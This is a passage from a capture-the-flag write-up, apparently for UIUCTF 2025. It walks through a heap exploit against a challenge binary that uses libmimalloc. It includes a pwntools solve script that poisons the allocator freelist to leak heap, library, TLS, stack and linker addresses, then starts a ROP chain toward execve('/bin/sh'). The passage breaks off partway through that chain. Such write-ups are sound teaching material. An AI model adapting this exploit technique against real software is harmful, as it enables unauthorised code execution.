<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x118</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tls_leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">tls_base</span> <span class="o">=</span> <span class="n">tls_leak</span> <span class="o">-</span> <span class="mh">0x1b28</span>
</span></span><span class="line"><span class="cl"><span class="n">environ</span> <span class="o">=</span> <span class="n">tls_base</span> <span class="o">+</span> <span class="mh">0x1d60</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;TLS leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tls_leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;TLS base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tls_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;environ: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">environ</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">rip</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Stack leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">stack_leak</span><span class="p">)</span></span></span></code></pre></div></div>
<p>There are a lot of gadgets in libmimalloc, but I couldn&rsquo;t find a syscall instruction within the library itself. However, the dynamic linker contains a syscall function that includes the syscall instruction. Fortunately, we can leak the address of the linker through the GOT in libmimalloc, which allows us to locate the syscall gadget.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/syscallgot.png"
        data-srcset="/posts/uiuctf_2025/images/syscallgot.png, /posts/uiuctf_2025/images/syscallgot.png 1.5x, /posts/uiuctf_2025/images/syscallgot.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/syscallgot.png"
        title="img" width="1362" height="75" />
<img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/posts/uiuctf_2025/images/syscall.png"
        data-srcset="/posts/uiuctf_2025/images/syscall.png, /posts/uiuctf_2025/images/syscall.png 1.5x, /posts/uiuctf_2025/images/syscall.png 2x"
        data-sizes="auto"
        alt="/posts/uiuctf_2025/images/syscall.png"
        title="img" width="1712" height="728" /></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x29c50</span><span class="p">))</span> <span class="c1"># syscall got. Syscall points to ld</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall_got</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">ld_base</span> <span class="o">=</span> <span class="n">syscall_got</span> <span class="o">-</span> <span class="mh">0x55f1f</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;ld leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">syscall_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;ld base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">ld_base</span><span class="p">)</span></span></span></code></pre></div></div>
<p>What we can do now is simply allocate a chunk at the RIP address and overwrite it with our ROP chain. I crafted a ROP chain that performs an execve syscall. Since the challenge used BusyBox, I had to invoke it like this:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-c">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">execve</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">},</span> <span class="mi">0</span><span class="p">)</span></span></span></code></pre></div></div>
<p>I placed the <code>/bin/sh</code> string in the first chunk I allocated. Later, I edited another chunk to create the argv array for the execve syscall: the first QWORD points to the <code>/bin/sh</code> string, and the second QWORD is set to 0. This is necessary because if the second <strong>QWORD (i.e., argv[1]) isn’t NULL</strong>, the shell won’t spawn properly. Additionally, since pwntools automatically sends a newline character with <code>sendline()</code>, it’s important to account for that when constructing your payload.</p>
<p>The final solve script:</p>
<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
    <div class="code-header language-py">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="s1">&#39;./chal&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libmimalloc.so.2.2&#34;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delim</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">rl</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span><span class="p">:</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">u32d</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">u64d</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">position</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">position</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">position</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">position</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">position</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x10080</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Heap leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Heap base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">heap_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">19</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x190</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[</span><span class="mi">48</span><span class="p">:</span><span class="mi">48</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x2b100</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Libc leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">libc_leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Libc base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x118</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tls_leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">tls_base</span> <span class="o">=</span> <span class="n">tls_leak</span> <span class="o">-</span> <span class="mh">0x1b28</span>
</span></span><span class="line"><span class="cl"><span class="n">environ</span> <span class="o">=</span> <span class="n">tls_base</span> <span class="o">+</span> <span class="mh">0x1d60</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;TLS leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tls_leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;TLS base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">tls_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;environ: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">environ</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">rip</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Stack leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">stack_leak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x29c50</span><span class="p">))</span> <span class="c1"># syscall got. Syscall points to ld</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall_got</span> <span class="o">=</span> <span class="n">u64d</span><span class="p">(</span><span class="n">rl</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">ld_base</span> <span class="o">=</span> <span class="n">syscall_got</span> <span class="o">-</span> <span class="mh">0x55f1f</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;ld leak: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">syscall_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;ld base: </span><span class="si">%#x</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">ld_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x10a80</span><span class="p">))</span> <span class="c1"># Fix freelist</span>
</span></span><span class="line"><span class="cl"><span class="n">edit</span><span class="p">(</span><span class="mi">15</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">rip</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">create</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">poprdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x8555</span> <span class="c1"># pop rdi; ret;</span>
</span></span><span class="line"><span class="cl"><span class="n">poprsi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x7764</span> <span class="c1"># pop rsi; ret;</span>
